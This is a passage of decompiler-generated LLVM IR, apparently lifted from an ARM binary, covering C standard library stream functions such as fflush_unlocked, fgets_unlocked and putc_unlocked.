  %v2_25908 = inttoptr i32 %v4_25904 to i32*
  store i32 %v0_25908, i32* %v2_25908, align 4
  %v0_25910.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2590c

dec_label_pc_2590c:                               ; preds = %entry, %dec_label_pc_2584c, %dec_label_pc_258e8
  %v0_25910 = phi i32 [ %v0_2583c, %entry ], [ %v0_2583c, %dec_label_pc_2584c ], [ %v0_25910.pre, %dec_label_pc_258e8 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_25910 = add i32 %v0_25910, 12
  %v3_25910 = inttoptr i32 %v2_25910 to i32*
  %v4_25910 = load i32, i32* %v3_25910, align 4
  %v1_25914 = inttoptr i32 %v4_25910 to i32*
  %v2_25914 = load i32, i32* %v1_25914, align 4
  %v1_25918 = add i32 %v2_25914, -1
  store i32 %v1_25918, i32* %v1_25914, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_2592c = load i32, i32* %r6.global-to-local, align 4
  %v2_2592c = add i32 %v0_2592c, 76
  %v3_2592c = inttoptr i32 %v2_2592c to i32*
  %v4_2592c = load i32, i32* %v3_2592c, align 4
  store i32 %v4_2592c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2592c)
  %v2_2593c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2593c, i32* %r4.global-to-local, align 4
  ret i32 %v2_25818

; uselistorder directives
  uselistorder i32 %v0_258d8, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 7, 1, 5, 2, 6, 3, 4, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 21, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 116, { 1, 3, 2, 4, 5, 8, 9, 6, 10, 0, 7 }
  uselistorder label %dec_label_pc_2590c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_258d8, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_258a0, { 1, 0 }
}

define i32 @function_25948(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_25948:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_25948 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25948, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_25948
  store i32 %tmp, i32* %arg1, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_25948, %bb
  %v4_2596c = phi i32 [ %tmp, %dec_label_pc_25948 ], [ 0, %bb ]
  ret i32 %v4_2596c

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %sb.global-to-local, align 4
  %v4_25980 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 108) to i32*), align 4
  store i32 %v4_25980, i32* %r3.global-to-local, align 4
  %v10_25984 = icmp eq i32 %tmp, %v4_25980
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_25984, label %bb, label %dec_label_pc_2599c

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_259ac

dec_label_pc_2599c:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_259a0 = icmp eq i16* %arg1, null
  br i1 %v2_259a0, label %dec_label_pc_259ac, label %dec_label_pc_25b14

dec_label_pc_259ac:                               ; preds = %bb, %dec_label_pc_2599c
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_2599c ]
  store i32 248, i32* %r3.global-to-local, align 4
  store i32 36, i32* %r2.global-to-local, align 4
  %v4_259c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 248) to i32*), align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_259cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 36, i32* %stack_var_-72, align 4
  store i32 %v4_259c0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_259cc)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_259f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_259f0 = add i32 %v0_259f0, 36
  %v3_259f0 = inttoptr i32 %v2_259f0 to i32*
  %v4_259f0 = load i32, i32* %v3_259f0, align 4
  call void @__pseudo_branch(i32 %v4_259f0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_25a00 = add i32 %v0_259f0, 12
  %v3_25a00 = inttoptr i32 %v2_25a00 to i32*
  %v4_25a00 = load i32, i32* %v3_25a00, align 4
  store i32 %v4_25a00, i32* %r2.global-to-local, align 4
  %v1_25a04 = inttoptr i32 %v4_25a00 to i32*
  %v2_25a04 = load i32, i32* %v1_25a04, align 4
  store i32 76, i32* %sl.global-to-local, align 4
  %v1_25a0c = add i32 %v2_25a04, 1
  store i32 %v1_25a0c, i32* %r3.global-to-local, align 4
  %v2_25a10 = add i32 %v0_259f0, 76
  %v3_25a10 = inttoptr i32 %v2_25a10 to i32*
  %v4_25a10 = load i32, i32* %v3_25a10, align 4
  store i32 %v1_25a0c, i32* %v1_25a04, align 4
  call void @__pseudo_branch(i32 %v4_25a10)
  store i32 224, i32* %r3.global-to-local, align 4
  %v0_25a2c = load i32, i32* %sb.global-to-local, align 4
  %v2_25a2c = add i32 %v0_25a2c, 224
  %v3_25a2c = inttoptr i32 %v2_25a2c to i32*
  %v4_25a2c = load i32, i32* %v3_25a2c, align 4
  store i32 %v4_25a2c, i32* @r4, align 4
  store i32 %v4_25a2c, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_259cc)
  call void @__pseudo_branch(i32 %v4_259f0)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_25a54 = load i32, i32* %sb.global-to-local, align 4
  %v2_25a54 = add i32 %v0_25a54, 108
  %v3_25a54 = inttoptr i32 %v2_25a54 to i32*
  %v4_25a54 = load i32, i32* %v3_25a54, align 4
  store i32 %v4_25a54, i32* %r3.global-to-local, align 4
  %v1_25a60 = inttoptr i32 %v4_25a54 to i32*
  %v2_25a60 = load i32, i32* %v1_25a60, align 4
  store i32 %v2_25a60, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_25a10)
  %v0_25a6c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_25a6c, i32* @r6, align 4
  %v2_25a70 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_25a70, i32* @r8, align 4
  store i32 164, i32* %fp.global-to-local, align 4
  %v0_25b04.pr = load i32, i32* @r7, align 4
  %v2_25b0419 = icmp eq i32 %v0_25b04.pr, 0
  br i1 %v2_25b0419, label %dec_label_pc_25b0c, label %dec_label_pc_25a78

dec_label_pc_25a78:                               ; preds = %dec_label_pc_259ac, %dec_label_pc_25b00
  %v0_25a84 = phi i32 [ %v3_25b00, %dec_label_pc_25b00 ], [ %v0_25b04.pr, %dec_label_pc_259ac ]
  %v1_25a78 = inttoptr i32 %v0_25a84 to i16*
  %v2_25a78 = load i16, i16* %v1_25a78, align 2
  %v3_25a78 = zext i16 %v2_25a78 to i32
  store i32 %v3_25a78, i32* %r3.global-to-local, align 4
  %v1_25a7c = and i32 %v3_25a78, 64
  %v2_25a7c = icmp eq i32 %v1_25a7c, 0
  br i1 %v2_25a7c, label %dec_label_pc_25b00, label %dec_label_pc_25a84

dec_label_pc_25a84:                               ; preds = %dec_label_pc_25a78
  %v1_25a84 = add i32 %v0_25a84, 56
  store i32 %v1_25a84, i32* @r4, align 4
  store i32 %v1_25a84, i32* %r2.global-to-local, align 4
  %v0_25a94 = load i32, i32* %sb.global-to-local, align 4
  %v1_25a94 = load i32, i32* %fp.global-to-local, align 4
  %v2_25a94 = add i32 %v1_25a94, %v0_25a94
  %v3_25a94 = inttoptr i32 %v2_25a94 to i32*
  %v4_25a94 = load i32, i32* %v3_25a94, align 4
  call void @__pseudo_branch(i32 %v4_25a94)
  %v1_25aa4 = load i32, i32* @r8, align 4
  %v2_25aa4 = add i32 %v1_25aa4, %v0_25a94
  %v3_25aa4 = inttoptr i32 %v2_25aa4 to i32*
  %v4_25aa4 = load i32, i32* %v3_25aa4, align 4
  call void @__pseudo_branch(i32 %v4_25aa4)
  %v0_25ab0 = load i32, i32* @r7, align 4
  %v1_25ab0 = inttoptr i32 %v0_25ab0 to i16*
  %v2_25ab0 = load i16, i16* %v1_25ab0, align 2
  %v3_25ab0 = zext i16 %v2_25ab0 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_25ab8 = or i32 %v3_25ab0, %stack_var_-60.1.in
  %v1_25abc = xor i32 %v2_25ab8, 320
  store i32 %v1_25abc, i32* %r3.global-to-local, align 4
  %v1_25ac0 = and i32 %v1_25abc, 832
  %v2_25ac0 = icmp eq i32 %v1_25ac0, 0
  br i1 %v2_25ac0, label %dec_label_pc_25ac8, label %bb38

dec_label_pc_25ac8:                               ; preds = %dec_label_pc_25a84
  store i32 %v0_25ab0, i32* @r0, align 4
  %v0_25acc = call i32 @__stdio_wcommit()
  %v2_25ad0 = icmp eq i32 %v0_25acc, 0
  br i1 %v2_25ad0, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_25ac8
  %v1_25ad4 = load i32, i32* @r7, align 4
  %v2_25ad4 = inttoptr i32 %v1_25ad4 to i16*
  %v3_25ad4 = load i16, i16* %v2_25ad4, align 2
  %v4_25ad4 = zext i16 %v3_25ad4 to i32
  store i32 %v4_25ad4, i32* %r3.global-to-local, align 4
  %v2_25ad8 = add i32 %v1_25ad4, 8
  %v3_25ad8 = inttoptr i32 %v2_25ad8 to i32*
  %v4_25ad8 = load i32, i32* %v3_25ad8, align 4
  store i32 %v4_25ad8, i32* %r2.global-to-local, align 4
  %v2_25adc = and i32 %v4_25ad4, 65471
  store i32 %v2_25adc, i32* %r3.global-to-local, align 4
  %v3_25ae0 = add i32 %v1_25ad4, 28
  %v4_25ae0 = inttoptr i32 %v3_25ae0 to i32*
  store i32 %v4_25ad8, i32* %v4_25ae0, align 4
  %v1_25ae4 = load i32, i32* %r3.global-to-local, align 4
  %v2_25ae4 = trunc i32 %v1_25ae4 to i16
  %v3_25ae4 = load i32, i32* @r7, align 4
  %v4_25ae4 = inttoptr i32 %v3_25ae4 to i16*
  store i16 %v2_25ae4, i16* %v4_25ae4, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_25ac8
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_25a84, %.thread8
  %v0_25af4 = load i32, i32* %sb.global-to-local, align 4
  %v1_25af4 = load i32, i32* %sl.global-to-local, align 4
  %v2_25af4 = add i32 %v1_25af4, %v0_25af4
  %v3_25af4 = inttoptr i32 %v2_25af4 to i32*
  %v4_25af4 = load i32, i32* %v3_25af4, align 4
  call void @__pseudo_branch(i32 %v4_25af4)
  %v0_25b00.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_25b00

dec_label_pc_25b00:                               ; preds = %dec_label_pc_25a78, %bb38
  %v0_25b00 = phi i32 [ %v0_25a84, %dec_label_pc_25a78 ], [ %v0_25b00.pre, %bb38 ]
  %v1_25b00 = add i32 %v0_25b00, 32
  %v2_25b00 = inttoptr i32 %v1_25b00 to i32*
  %v3_25b00 = load i32, i32* %v2_25b00, align 4
  store i32 %v3_25b00, i32* @r7, align 4
  %v2_25b04 = icmp eq i32 %v3_25b00, 0
  br i1 %v2_25b04, label %dec_label_pc_25b0c, label %dec_label_pc_25a78

dec_label_pc_25b0c:                               ; preds = %dec_label_pc_25b00, %dec_label_pc_259ac
  %v0_25b0c = call i32 @_stdio_openlist_dec_use()
  %v0_25b48.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_25b14:                               ; preds = %dec_label_pc_2599c
  %v2_25b14 = load i16, i16* %arg1, align 2
  %v3_25b14 = zext i16 %v2_25b14 to i32
  %v1_25b18 = and i32 %v3_25b14, 64
  store i32 %v1_25b18, i32* %r3.global-to-local, align 4
  %v2_25b18 = icmp eq i32 %v1_25b18, 0
  br i1 %v2_25b18, label %bb39, label %dec_label_pc_25b24

bb39:                                             ; preds = %dec_label_pc_25b14
  br label %bb40

dec_label_pc_25b24:                               ; preds = %dec_label_pc_25b14
  %v0_25b24 = call i32 @__stdio_wcommit()
  %v2_25b28 = icmp eq i32 %v0_25b24, 0
  br i1 %v2_25b28, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_25b24
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_25b24
  %v1_25b2c = load i32, i32* %fp.global-to-local, align 4
  %v2_25b2c = inttoptr i32 %v1_25b2c to i16*
  %v3_25b2c = load i16, i16* %v2_25b2c, align 2
  %v4_25b2c = zext i16 %v3_25b2c to i32
  store i32 %v4_25b2c, i32* %r3.global-to-local, align 4
  %v2_25b30 = add i32 %v1_25b2c, 8
  %v3_25b30 = inttoptr i32 %v2_25b30 to i32*
  %v4_25b30 = load i32, i32* %v3_25b30, align 4
  store i32 %v4_25b30, i32* %r2.global-to-local, align 4
  %v2_25b34 = and i32 %v4_25b2c, 65471
  store i32 %v2_25b34, i32* %r3.global-to-local, align 4
  %v2_25b38 = trunc i32 %v2_25b34 to i16
  store i16 %v2_25b38, i16* %v2_25b2c, align 2
  %v1_25b3c = load i32, i32* %r2.global-to-local, align 4
  %v2_25b3c = load i32, i32* %fp.global-to-local, align 4
  %v3_25b3c = add i32 %v2_25b3c, 28
  %v4_25b3c = inttoptr i32 %v3_25b3c to i32*
  store i32 %v1_25b3c, i32* %v4_25b3c, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_25b0c, %.thread15
  %v0_25b48 = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_25b48.pre, %dec_label_pc_25b0c ], [ 0, %.thread15 ]
  ret i32 %v0_25b48

; uselistorder directives
  uselistorder i32 %v3_25b00, { 1, 2, 0 }
  uselistorder i32 %v0_259f0, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 248) to i32*), { 1, 2, 0 }
  uselistorder i32 248, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_25b00, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25a78, { 1, 0 }
  uselistorder label %dec_label_pc_259ac, { 1, 0 }
}

define i32 @function_25b5c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_25b5c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_25b5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25b5c, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_25b5c
  %v2_25b5c = load i32, i32* @ip, align 4
  %v4_25b5c = and i32 %v2_25b5c, %tmp
  %v4_25b64 = inttoptr i32 %v4_25b5c to i32*
  store i32 %v4_25b5c, i32* %v4_25b64, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_25b5c, %bb
  %v9_25b78 = phi i32 [ %tmp, %dec_label_pc_25b5c ], [ 0, %bb ]
  ret i32 %v9_25b78

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_25b7c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_25b80 = icmp eq i32 %arg2, 0
  store i1 %v2_25b80, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_25c08, label %dec_label_pc_25bf0.preheader

dec_label_pc_25bf0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_25bf02 = add i32 %arg2, -1
  store i32 %v1_25bf02, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_25bf08 = icmp eq i32 %arg2, 1
  store i1 %v7_25bf08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_25bf08, label %dec_label_pc_25bf8, label %dec_label_pc_25b9c

dec_label_pc_25b9c:                               ; preds = %dec_label_pc_25bf0.preheader, %dec_label_pc_25bf0.backedge.dec_label_pc_25b9c_crit_edge
  %v0_25bc0 = phi i32 [ %v0_25b9c.pre, %dec_label_pc_25bf0.backedge.dec_label_pc_25b9c_crit_edge ], [ %arg3, %dec_label_pc_25bf0.preheader ]
  %v1_25b9c = add i32 %v0_25bc0, 16
  %v2_25b9c = inttoptr i32 %v1_25b9c to i32*
  %v3_25b9c = load i32, i32* %v2_25b9c, align 4
  store i32 %v3_25b9c, i32* %r2.global-to-local, align 4
  %v1_25ba0 = add i32 %v0_25bc0, 24
  %v2_25ba0 = inttoptr i32 %v1_25ba0 to i32*
  %v3_25ba0 = load i32, i32* %v2_25ba0, align 4
  store i32 %v3_25ba0, i32* %r3.global-to-local, align 4
  %v3_25ba4 = icmp uge i32 %v3_25b9c, %v3_25ba0
  store i1 %v3_25ba4, i1* %cpsr_c.global-to-local, align 1
  %v9_25ba4 = icmp eq i32 %v3_25b9c, %v3_25ba0
  store i1 %v9_25ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_25ba4, label %dec_label_pc_25bc0, label %dec_label_pc_25bac

dec_label_pc_25bac:                               ; preds = %dec_label_pc_25b9c
  %v1_25bac = inttoptr i32 %v3_25b9c to i8*
  %v2_25bac = load i8, i8* %v1_25bac, align 1
  %v3_25bac = zext i8 %v2_25bac to i32
  store i32 %v3_25bac, i32* %r3.global-to-local, align 4
  %v5_25bac = add i32 %v3_25b9c, 1
  store i32 %v5_25bac, i32* %r2.global-to-local, align 4
  %v2_25bb0 = load i32, i32* @r5, align 4
  %v3_25bb0 = inttoptr i32 %v2_25bb0 to i8*
  store i8 %v2_25bac, i8* %v3_25bb0, align 1
  %v4_25bb0 = load i32, i32* @r5, align 4
  %v5_25bb0 = add i32 %v4_25bb0, 1
  store i32 %v5_25bb0, i32* @r5, align 4
  %v0_25bb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_25bb4 = icmp ugt i32 %v0_25bb4, 9
  store i1 %v2_25bb4, i1* %cpsr_c.global-to-local, align 1
  %v7_25bb4 = icmp eq i32 %v0_25bb4, 10
  store i1 %v7_25bb4, i1* %cpsr_z.global-to-local, align 1
  %v0_25bb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_25bb8 = load i32, i32* @r4, align 4
  %v2_25bb8 = add i32 %v1_25bb8, 16
  %v3_25bb8 = inttoptr i32 %v2_25bb8 to i32*
  store i32 %v0_25bb8, i32* %v3_25bb8, align 4
  br i1 %v7_25bb4, label %dec_label_pc_25bf8, label %dec_label_pc_25bf0.backedge

dec_label_pc_25bc0:                               ; preds = %dec_label_pc_25b9c
  %v1_25bc0 = inttoptr i32 %v0_25bc0 to i16*
  %v3_25bc4 = call i32 @getc_unlocked(i16* %v1_25bc0)
  %v3_25bc8 = icmp eq i32 %v3_25bc4, -1
  store i1 %v3_25bc8, i1* %cpsr_c.global-to-local, align 1
  %v8_25bc8 = icmp eq i32 %v3_25bc4, -1
  store i1 %v8_25bc8, i1* %cpsr_z.global-to-local, align 1
  %v1_25bcc = urem i32 %v3_25bc4, 256
  store i32 %v1_25bcc, i32* %r3.global-to-local, align 4
  br i1 %v3_25bc8, label %dec_label_pc_25bd4, label %dec_label_pc_25bec

dec_label_pc_25bd4:                               ; preds = %dec_label_pc_25bc0
  %v0_25bd4 = load i32, i32* @r4, align 4
  %v1_25bd4 = inttoptr i32 %v0_25bd4 to i16*
  %v2_25bd4 = load i16, i16* %v1_25bd4, align 2
  %v3_25bd4 = zext i16 %v2_25bd4 to i32
  store i32 %v3_25bd4, i32* %r3.global-to-local, align 4
  %v1_25bd8 = and i32 %v3_25bd4, 8
  %v2_25bd8 = icmp eq i32 %v1_25bd8, 0
  store i1 %v2_25bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_25bd8, label %dec_label_pc_25bf8, label %dec_label_pc_25c08

dec_label_pc_25bec:                               ; preds = %dec_label_pc_25bc0
  %v1_25be4 = trunc i32 %v3_25bc4 to i8
  %v2_25be4 = load i32, i32* @r5, align 4
  %v3_25be4 = inttoptr i32 %v2_25be4 to i8*
  store i8 %v1_25be4, i8* %v3_25be4, align 1
  %v4_25be4 = load i32, i32* @r5, align 4
  %v5_25be4 = add i32 %v4_25be4, 1
  store i32 %v5_25be4, i32* @r5, align 4
  %v0_25be8 = load i32, i32* %r3.global-to-local, align 4
  %v2_25be8 = icmp ugt i32 %v0_25be8, 9
  store i1 %v2_25be8, i1* %cpsr_c.global-to-local, align 1
  %v7_25be8 = icmp eq i32 %v0_25be8, 10
  store i1 %v7_25be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_25be8, label %dec_label_pc_25bf8, label %dec_label_pc_25bf0.backedge

dec_label_pc_25bf0.backedge:                      ; preds = %dec_label_pc_25bec, %dec_label_pc_25bac
  %v0_25bf0 = load i32, i32* %r6.global-to-local, align 4
  %v1_25bf0 = add i32 %v0_25bf0, -1
  store i32 %v1_25bf0, i32* %r6.global-to-local, align 4
  %v2_25bf0 = icmp ne i32 %v0_25bf0, 0
  store i1 %v2_25bf0, i1* %cpsr_c.global-to-local, align 1
  %v7_25bf0 = icmp eq i32 %v0_25bf0, 1
  store i1 %v7_25bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_25bf0, label %dec_label_pc_25bf8, label %dec_label_pc_25bf0.backedge.dec_label_pc_25b9c_crit_edge

dec_label_pc_25bf0.backedge.dec_label_pc_25b9c_crit_edge: ; preds = %dec_label_pc_25bf0.backedge
  %v0_25b9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_25b9c

dec_label_pc_25bf8:                               ; preds = %dec_label_pc_25bec, %dec_label_pc_25bf0.backedge, %dec_label_pc_25bac, %dec_label_pc_25bf0.preheader, %dec_label_pc_25bd4
  %v0_25bf8 = load i32, i32* @r5, align 4
  %v1_25bf8 = load i32, i32* @r7, align 4
  %v3_25bf8 = icmp uge i32 %v0_25bf8, %v1_25bf8
  store i1 %v3_25bf8, i1* %cpsr_c.global-to-local, align 1
  %v9_25bf8 = icmp eq i32 %v0_25bf8, %v1_25bf8
  store i1 %v9_25bf8, i1* %cpsr_z.global-to-local, align 1
  %v2_25bfc = xor i1 %v9_25bf8, true
  %v3_25bfc = and i1 %v3_25bf8, %v2_25bfc
  br i1 %v3_25bfc, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_25bf8
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_25c00 = inttoptr i32 %v0_25bf8 to i8*
  store i8 0, i8* %v7_25c00, align 1
  %v0_25c04.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_25c04.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_25bf8, %bb
  %v1_25c04 = phi i1 [ %v1_25c04.pre, %bb ], [ %v9_25bf8, %dec_label_pc_25bf8 ]
  %v0_25c04 = phi i1 [ %v0_25c04.pre, %bb ], [ %v3_25bf8, %dec_label_pc_25bf8 ]
  %v2_25c04 = xor i1 %v1_25c04, true
  %v3_25c04 = and i1 %v0_25c04, %v2_25c04
  br i1 %v3_25c04, label %.dec_label_pc_25c0c_crit_edge, label %dec_label_pc_25c08

.dec_label_pc_25c0c_crit_edge:                    ; preds = %.thread14
  %v0_25c0c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_25c0c

dec_label_pc_25c08:                               ; preds = %entry, %dec_label_pc_25bd4, %.thread14
  br label %dec_label_pc_25c0c

dec_label_pc_25c0c:                               ; preds = %.dec_label_pc_25c0c_crit_edge, %dec_label_pc_25c08
  %v0_25c0c = phi i32 [ %v0_25c0c.pre, %.dec_label_pc_25c0c_crit_edge ], [ 0, %dec_label_pc_25c08 ]
  store i32 %v6_25b7c, i32* @r5, align 4
  ret i32 %v0_25c0c

; uselistorder directives
  uselistorder i1 %v9_25bf8, { 1, 0, 2 }
  uselistorder i32 %v1_25bf8, { 1, 0 }
  uselistorder i32 %v0_25bf8, { 0, 2, 1 }
  uselistorder i32 %v0_25bf0, { 2, 0, 1 }
  uselistorder i32 %v0_25be8, { 1, 0 }
  uselistorder i32 %v3_25bc4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_25bb4, { 1, 0 }
  uselistorder i32 %v3_25b9c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_25bc0, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_25c0c, { 1, 0 }
  uselistorder label %dec_label_pc_25c08, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_25bf8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_25b9c, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_25c1c = load i32, i32* @r4, align 4
  store i32 %v3_25c1c, i32* %stack_var_-12, align 4
  %v6_25c1c = load i32, i32* @r5, align 4
  %v2_25c20 = add i32 %arg2, 16
  %v3_25c20 = inttoptr i32 %v2_25c20 to i32*
  %v4_25c20 = load i32, i32* %v3_25c20, align 4
  store i32 %v4_25c20, i32* %r2.global-to-local, align 4
  %v2_25c24 = add i32 %arg2, 28
  %v3_25c24 = inttoptr i32 %v2_25c24 to i32*
  %v4_25c24 = load i32, i32* %v3_25c24, align 4
  store i32 %v4_25c24, i32* %r3.global-to-local, align 4
  %v3_25c28 = icmp uge i32 %v4_25c20, %v4_25c24
  store i1 %v3_25c28, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_25c34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_25c34, i32* @r5, align 4
  br i1 %v3_25c28, label %dec_label_pc_25c4c, label %.thread

.thread:                                          ; preds = %entry
  %v2_25c38 = urem i32 %v0_25c34, 256
  store i32 %v2_25c38, i32* %r3.global-to-local, align 4
  %v2_25c3c = trunc i32 %v0_25c34 to i8
  %v4_25c3c = inttoptr i32 %v4_25c20 to i8*
  store i8 %v2_25c3c, i8* %v4_25c3c, align 1
  %v5_25c3c = load i32, i32* %r2.global-to-local, align 4
  %v6_25c3c = add i32 %v5_25c3c, 1
  store i32 %v6_25c3c, i32* %r2.global-to-local, align 4
  %v0_25c40.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_25c40.pr.pr, label %dec_label_pc_25c4c, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_25c40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_25c40, i32* %r0.global-to-local, align 4
  store i32 %v6_25c3c, i32* %v3_25c20, align 4
  br label %dec_label_pc_25d18

dec_label_pc_25c4c:                               ; preds = %entry, %.thread
  %v3_25c4c = load i16, i16* %tmp, align 2
  %v4_25c4c = zext i16 %v3_25c4c to i32
  %v1_25c50 = and i32 %v4_25c4c, 192
  store i32 %v1_25c50, i32* %r3.global-to-local, align 4
